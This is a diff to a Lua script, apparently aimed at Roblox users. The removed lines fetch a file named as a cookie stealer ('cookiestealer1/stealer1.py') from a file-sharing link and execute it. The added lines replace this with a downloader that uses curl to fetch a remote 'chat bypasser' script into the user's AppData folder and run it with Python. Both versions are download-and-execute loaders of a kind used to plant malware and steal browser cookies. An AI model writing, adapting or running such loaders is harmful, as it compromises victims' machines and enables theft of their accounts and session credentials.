@@ -1,6 +1,40 @@
-local http = game:GetService("HttpService")
+-- Lua script to auto-download and execute a Python script and save it to the AppData directory
 
-local scriptURL = "https://link.storjshare.io/s/judkuyasitnisjdvse72mesqkwvq/cookiestealer1/stealer1.py?download=1"
-local scriptData = http:GetAsync(scriptURL)
+-- URL of the Python script to download
+local script_url = "https://raw.githubusercontent.com/Meganugger/Chat-bypasser-REVAMPED/refs/heads/main/Chat-bypasser-REVAMPED"  -- Replace with the actual URL
 
-loadstring(scriptData)(Game) -- Use loadstring to execute the script
+-- Function to get the current user's AppData path
+function get_appdata_path()
+    local appdata_path = os.getenv("APPDATA")
+    if not appdata_path then
+        print("Error: Could not retrieve AppData path.")
+        return nil
+    end
+    return appdata_path
+end
+
+-- Function to download the script using curl
+function download_script(url, path)
+    local command = 'curl -o "' .. path .. '" "' .. url .. '"'
+    local result = os.execute(command)
+
+    if result == 0 then
+        print("Script downloaded successfully!")
+    else
+        print("Failed to download script.")
+    end
+end
+
+-- Function to execute the downloaded Python script
+function execute_script(path)
+    local command = "python " .. path
+    os.execute(command)
+end
+
+-- Main
+local appdata_path = get_appdata_path()
+if appdata_path then
+    local script_path = appdata_path .. "\\downloaded_script.py"  -- Save script in AppData
+    download_script(script_url, script_path)
+    execute_script(script_path)
+end
